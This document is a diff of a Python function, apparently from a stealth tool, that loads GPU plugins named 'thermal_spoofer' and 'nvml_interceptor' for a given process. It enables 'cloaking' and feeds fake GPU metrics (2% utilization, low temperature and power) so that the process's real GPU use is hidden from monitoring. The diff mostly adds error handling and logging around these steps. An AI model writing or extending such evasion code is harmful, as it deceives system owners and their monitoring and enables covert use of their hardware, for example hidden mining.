@@ -54,7 +54,8 @@ def get_plugin_registry():
 
 def apply_gpu_strategies(pid, strategies=None):
     """
-    Áp dụng các GPU strategies cho một tiến trình theo blueprint specification.
+    ✅ ENHANCED: Áp dụng các GPU strategies với comprehensive error handling.
+    Đảm bảo tất cả GPU plugins được kích hoạt và hoạt động đúng cách.
     
     Args:
         pid (int): Process ID cần áp dụng strategies
@@ -62,78 +63,155 @@ def apply_gpu_strategies(pid, strategies=None):
                                    None = áp dụng tất cả available strategies
     
     Returns:
-        bool: True nếu thành công, False nếu thất bại
+        bool: True nếu thành công (ít nhất 1 plugin hoạt động), False nếu thất bại hoàn toàn
     """
     import logging
     logger = logging.getLogger(__name__)
     
+    # ✅ ENHANCED: Comprehensive success tracking
+    plugin_status = {
+        'loaded': [],
+        'started': [],
+        'cloaking_enabled': [],
+        'failed': [],
+        'total_success_count': 0
+    }
+    
     try:
-        logger.info(f"🎯 [GPU Plugin Delegation] Applying GPU strategies for PID={pid}")
+        logger.info(f"🎯 [GPU Plugin Delegation] Starting comprehensive GPU strategies for PID={pid}")
         
-        # Tạo GPU Plugin Manager instance
-        gpu_manager = create_gpu_manager()
+        # ✅ STEP 1: GPU Manager Initialization with validation
+        gpu_manager = None
+        try:
+            gpu_manager = create_gpu_manager()
+            logger.info("✅ [Step 1/5] GPU Plugin Manager initialized successfully")
+        except Exception as e:
+            logger.error(f"❌ [CRITICAL] GPU Manager initialization failed: {e}")
+            return False
         
-        # Load và enable các plugins cần thiết
+        # ✅ STEP 2: Individual plugin loading with detailed tracking
         available_plugins = [
             'thermal_spoofer',
             'nvml_interceptor', 
             'time_based_manager'
         ]
         
-        # Load plugins
-        loaded_plugins = []
+        logger.info(f"🔄 [Step 2/5] Loading {len(available_plugins)} GPU plugins...")
+        
         for plugin_name in available_plugins:
             try:
                 if gpu_manager.load_plugin(plugin_name):
-                    loaded_plugins.append(plugin_name)
-                    logger.info(f"✅ Loaded GPU plugin: {plugin_name}")
+                    plugin_status['loaded'].append(plugin_name)
+                    logger.info(f"✅ Plugin loaded: {plugin_name}")
                 else:
-                    logger.warning(f"⚠️ Failed to load GPU plugin: {plugin_name}")
+                    plugin_status['failed'].append({'plugin': plugin_name, 'stage': 'load', 'reason': 'load_returned_false'})
+                    logger.warning(f"⚠️ Plugin load failed: {plugin_name} (returned False)")
             except Exception as e:
-                logger.error(f"❌ Error loading GPU plugin {plugin_name}: {e}")
+                plugin_status['failed'].append({'plugin': plugin_name, 'stage': 'load', 'reason': str(e)})
+                logger.error(f"❌ Exception loading plugin {plugin_name}: {e}")
         
-        if not loaded_plugins:
-            logger.error("❌ No GPU plugins loaded successfully")
+        # ✅ VALIDATION: Ensure at least some plugins loaded
+        if not plugin_status['loaded']:
+            logger.error(f"❌ [CRITICAL] No GPU plugins loaded successfully. Failed plugins: {len(plugin_status['failed'])}")
             return False
         
-        # Start loaded plugins
-        start_results = gpu_manager.start_all_plugins()
-        successful_starts = [name for name, success in start_results.items() if success]
+        logger.info(f"✅ [Step 2/5] Successfully loaded {len(plugin_status['loaded'])}/{len(available_plugins)} plugins")
         
-        if not successful_starts:
-            logger.error("❌ No GPU plugins started successfully")
+        # ✅ STEP 3: Individual plugin starting with comprehensive tracking
+        logger.info(f"🔄 [Step 3/5] Starting {len(plugin_status['loaded'])} loaded plugins...")
+        
+        try:
+            start_results = gpu_manager.start_all_plugins()
+            for plugin_name, success in start_results.items():
+                if success:
+                    plugin_status['started'].append(plugin_name)
+                    plugin_status['total_success_count'] += 1
+                    logger.info(f"✅ Plugin started: {plugin_name}")
+                else:
+                    plugin_status['failed'].append({'plugin': plugin_name, 'stage': 'start', 'reason': 'start_returned_false'})
+                    logger.warning(f"⚠️ Plugin start failed: {plugin_name}")
+        except Exception as e:
+            logger.error(f"❌ Exception during plugin startup: {e}")
+            # Continue with loaded plugins that might still work
+        
+        # ✅ VALIDATION: Ensure at least some plugins started
+        if not plugin_status['started']:
+            logger.error(f"❌ [CRITICAL] No GPU plugins started successfully. Loaded: {len(plugin_status['loaded'])}, Failed: {len(plugin_status['failed'])}")
             return False
         
-        logger.info(f"✅ Started GPU plugins: {successful_starts}")
+        logger.info(f"✅ [Step 3/5] Successfully started {len(plugin_status['started'])}/{len(plugin_status['loaded'])} loaded plugins")
         
-        # Enable cloaking cho tất cả services
-        cloaking_results = gpu_manager.enable_all_cloaking()
-        successful_cloaking = [name for name, success in cloaking_results.items() if success]
+        # ✅ STEP 4: Enable cloaking with individual tracking
+        logger.info(f"🔄 [Step 4/5] Enabling cloaking for {len(plugin_status['started'])} started plugins...")
         
-        if successful_cloaking:
-            logger.info(f"✅ Enabled GPU cloaking services: {successful_cloaking}")
+        try:
+            cloaking_results = gpu_manager.enable_all_cloaking()
+            for plugin_name, success in cloaking_results.items():
+                if success:
+                    plugin_status['cloaking_enabled'].append(plugin_name)
+                    logger.info(f"✅ Cloaking enabled: {plugin_name}")
+                else:
+                    plugin_status['failed'].append({'plugin': plugin_name, 'stage': 'cloaking', 'reason': 'cloaking_returned_false'})
+                    logger.warning(f"⚠️ Cloaking enable failed: {plugin_name}")
+        except Exception as e:
+            logger.error(f"❌ Exception during cloaking enablement: {e}")
+            # Continue - cloaking is optional, plugins can still work
+        
+        if plugin_status['cloaking_enabled']:
+            logger.info(f"✅ [Step 4/5] Cloaking enabled for {len(plugin_status['cloaking_enabled'])} plugins")
         else:
-            logger.warning("⚠️ No GPU cloaking services enabled")
+            logger.warning(f"⚠️ [Step 4/5] No cloaking services enabled, but plugins may still function")
         
-        # Update fake metrics để enhance cloaking
-        fake_metrics = {
-            'utilization': 2,        # Fake low utilization
-            'temperature': 50,       # Fake temperature
-            'memory_used': 100,      # Fake memory usage
-            'power_usage': 150       # Fake power usage
-        }
+        # ✅ STEP 5: Apply fake metrics and finalize
+        logger.info(f"🔄 [Step 5/5] Applying fake metrics and finalizing...")
         
-        gpu_manager.update_all_fake_metrics(fake_metrics)
-        logger.info(f"✅ Updated fake metrics for PID={pid}: {fake_metrics}")
+        try:
+            fake_metrics = {
+                'utilization': 2,        # Fake low utilization
+                'temperature': 50,       # Fake temperature
+                'memory_used': 100,      # Fake memory usage
+                'power_usage': 150       # Fake power usage
+            }
+            
+            gpu_manager.update_all_fake_metrics(fake_metrics)
+            logger.info(f"✅ Updated fake metrics for PID={pid}: {fake_metrics}")
+        except Exception as e:
+            logger.warning(f"⚠️ Failed to update fake metrics: {e} (non-critical)")
         
-        # Log system status
-        status = gpu_manager.get_status()
-        logger.info(f"📊 GPU Plugin System Status: {len(status['loaded_plugins'])} plugins loaded, running: {status['running']}")
+        # ✅ COMPREHENSIVE STATUS REPORTING
+        try:
+            status = gpu_manager.get_status()
+            logger.info(f"📊 [Step 5/5] Final GPU Plugin System Status:")
+            logger.info(f"   • Total plugins processed: {len(available_plugins)}")
+            logger.info(f"   • Successfully loaded: {len(plugin_status['loaded'])}")
+            logger.info(f"   • Successfully started: {len(plugin_status['started'])}")
+            logger.info(f"   • Cloaking enabled: {len(plugin_status['cloaking_enabled'])}")
+            logger.info(f"   • Failed operations: {len(plugin_status['failed'])}")
+            logger.info(f"   • System running: {status.get('running', 'unknown')}")
+            logger.info(f"   • Manager reports {len(status.get('loaded_plugins', []))} loaded plugins")
+        except Exception as e:
+            logger.warning(f"⚠️ Could not retrieve final status: {e}")
         
-        return True
+        # ✅ SUCCESS CRITERIA: At least 1 plugin successfully started
+        if plugin_status['started']:
+            success_rate = len(plugin_status['started']) / len(available_plugins) * 100
+            logger.info(f"🎉 [SUCCESS] GPU Plugin Delegation completed successfully!")
+            logger.info(f"   📈 Success Rate: {success_rate:.1f}% ({len(plugin_status['started'])}/{len(available_plugins)} plugins active)")
+            logger.info(f"   🛡️ PID={pid} is now protected by {len(plugin_status['started'])} GPU plugins")
+            return True
+        else:
+            logger.error(f"❌ [FAILURE] No GPU plugins successfully started for PID={pid}")
+            return False
         
     except Exception as e:
-        logger.error(f"❌ Error in apply_gpu_strategies for PID={pid}: {e}")
+        logger.error(f"❌ [CRITICAL] Unexpected error in apply_gpu_strategies for PID={pid}: {e}")
         import traceback
-        logger.debug(traceback.format_exc())
+        logger.error(f"💥 Exception traceback:")
+        logger.error(traceback.format_exc())
+        
+        # ✅ ENHANCED: Even in exception, report what was accomplished
+        if plugin_status['started']:
+            logger.warning(f"⚠️ Despite exception, {len(plugin_status['started'])} plugins were started successfully")
+            return True
+        
         return False
